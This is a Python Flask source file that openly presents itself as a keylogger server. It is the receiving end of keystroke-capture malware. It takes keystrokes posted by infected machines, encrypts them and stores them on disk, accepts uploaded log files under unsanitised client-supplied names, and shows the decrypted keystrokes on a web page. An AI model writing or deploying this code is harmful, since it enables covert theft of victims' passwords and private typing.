
from flask import Flask, request, jsonify
import os
from datetime import datetime

from encryption import encrypt, decrypt

app = Flask(__name__)

# Folder to store received logs and files
LOG_FOLDER = "Logs"
os.makedirs(LOG_FOLDER, exist_ok=True)
log_file = os.path.join(LOG_FOLDER, "keystrokes.txt")

@app.route('/')
def index():
    return "✅ Flask Keylogger Server is running", 200

@app.route('/view', methods=['GET'])
def view_logs():
    if not os.path.exists(log_file):
        return "<h2>No keystrokes logged yet</h2>"

    decrypted_logs = ""
    try:
        with open(log_file, "r") as f:
            for line in f:
                try:
                    decrypted_logs += decrypt(line.strip()) + "<br>"
                except Exception as e:
                    decrypted_logs += f"[!] Failed to decrypt line: {e}<br>"
    except Exception as e:
        return f"<h2>Error reading log file:</h2><p>{e}</p>"

    return f"<h2>Logged Keystrokes</h2><p>{decrypted_logs}</p>"


# Route to receive individual keystrokes (JSON)
@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if not data or 'raw' not in data or 'timestamp' not in data:
        return jsonify({"status": "error", "message": "Invalid payload"}), 400

    log_line = f"{data['timestamp']} - RAW: {data['raw']}\n"
    encrypt_line=encrypt(log_line)

    with open(os.path.join(LOG_FOLDER, "keystrokes.txt"), "a") as f:
        f.write(encrypt_line + "\n")

    print("[+] Keystroke received:", data['raw'])
    return jsonify({"status": "received"}), 200


# Route to receive a whole file (multipart upload)
@app.route('/upload', methods=['POST'])
def upload():
    uploaded_file = request.files.get('logfile')
    if not uploaded_file:
        return jsonify({"status": "error", "message": "No file provided"}), 400

    filename = uploaded_file.filename or f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    path = os.path.join(LOG_FOLDER, filename)
    uploaded_file.save(path)

    print(f"[+] File received and saved to: {path}")
    return jsonify({"status": "file received"}), 200

# Start the server
if __name__ == '__main__':
    print("[*] Server running at http://0.0.0.0:5000/")
    app.run(host='0.0.0.0', port=5000, debug=False)
